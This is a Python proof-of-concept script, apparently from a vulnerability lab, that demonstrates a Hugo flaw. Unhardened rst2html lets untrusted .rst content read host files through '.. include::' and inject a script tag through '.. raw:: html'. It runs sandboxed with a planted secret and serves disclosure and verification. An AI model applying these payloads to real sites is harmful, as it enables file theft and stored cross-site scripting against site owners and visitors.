#!/usr/bin/env python3
"""
VULN-026 — reStructuredText content runs rst2html with docutils file-insertion/raw enabled -> LFI + XSS
======================================================================================================

VULN-ID     : VULN-026
Title       : text/rst omitted from allowContent; rst2html run with no --no-file-insertion/--no-raw
Vuln file   : targets/hugo/config/security/securityConfig.go:86 (allowContent omits text/rst)
              targets/hugo/markup/rst/convert.go:75-78 (no docutils hardening flags)
CWE         : CWE-829 (LFI / file inclusion) + CWE-79 (stored XSS)

The flaw
--------
The RST content format has no safety knob, `text/rst` is omitted from the
security.allowContent denylist, and Hugo invokes docutils' `rst2html` with no hardening
flag. docutils defaults to file_insertion_enabled=True and raw_enabled=True, so untrusted
`.rst` content reads arbitrary host files (`.. include::`) and injects HTML (`.. raw:: html`).

Enablement precondition: rst2html is not in the default security.exec.allow; the operator
installs docutils and adds `^rst2html(\\.py)?$`. This exploit uses the tools image (docutils
installed) + that exec.allow entry.

What a successful run proves
---------------------------
Untrusted .rst content reads a planted host secret into the published HTML AND injects a
<script> via `.. raw:: html`.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

VULN = "VULN-026"
IMAGE = "cvehunterlab_hugo_st10tools:latest"          # hugo + docutils(rst2html)
SECRET = "RST-LFI-" + C.rand()
XSS = "rst-xss-" + C.rand()


def main() -> int:
    C.banner(VULN, "RST content -> arbitrary host-file read (LFI) + stored XSS",
             info="rst2html run with no --no-file-insertion/--no-raw; text/rst omitted from allowContent",
             target="throwaway `hugo` build (tools image: docutils installed)")

    cfg = (
        "baseURL='http://localhost/'\ntitle='h26'\n"
        "disableKinds=['taxonomy','term','sitemap','rss','404']\n"
        "[security.exec]\n"
        "  allow = ['^(dart-)?sass$','^go$','^git$','^node$','^postcss$','^rst2html(\\.py)?$']\n"
    )
    # .. include:: reads a file (file_insertion_enabled); .. raw:: html emits raw HTML.
    rst = (
        ".. include:: /site/SECRET.txt\n\n"
        ".. raw:: html\n\n"
        f"   <script>{XSS}</script>\n"
    )
    files = {
        "hugo.toml": cfg,
        "content/p.rst": rst,
        "SECRET.txt": f"{SECRET}\n",
        "layouts/_default/single.html": "<!doctype html><body>{{ .Content }}</body>\n",
        "layouts/index.html": "home\n",
    }
    site = C.make_site(__file__, files)
    C.log("SETUP", f"planted /site/SECRET.txt = {SECRET!r}; content/p.rst uses .. include:: + .. raw:: html")

    C.log("STEP", "building with the tools image (rst2html on PATH, ^rst2html$ allowed)")
    rc, out, public = C.run_hugo(site, render_to_memory=False, network="none", memory="1g",
                                 timeout=90, image=IMAGE)
    page = os.path.join(public, "p", "index.html") if public else None
    html = open(page, encoding="utf-8").read() if page and os.path.isfile(page) else ""
    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as fh:
        fh.write(f"rc={rc}\n\n{html or out[-1500:]}")

    lfi = SECRET in html
    xss = f"<script>{XSS}</script>" in html
    C.log("PROOF", f"planted secret inlined (LFI via .. include::): {lfi}")
    C.log("PROOF", f"raw <script> emitted (stored XSS via .. raw:: html): {xss}")

    if lfi and xss:
        C.log("OK", "exploit confirmed — untrusted .rst content read a host file into the published HTML "
                    "(.. include::) AND emitted a raw <script> (.. raw:: html). RST escapes the Markdown-path "
                    "content sandbox.")
        print(f"==> {VULN}: CONFIRMED — RST docutils: host-file LFI + stored XSS")
        return 0
    if lfi or xss:
        C.log("OK", f"exploit confirmed (partial) — LFI={lfi}, XSS={xss}")
        print(f"==> {VULN}: CONFIRMED — RST raw-content sink (LFI/XSS)")
        return 0
    C.log("FAIL", f"neither LFI nor XSS observed (rc={rc}); build output:\n{out[-800:]}")
    print(f"==> {VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
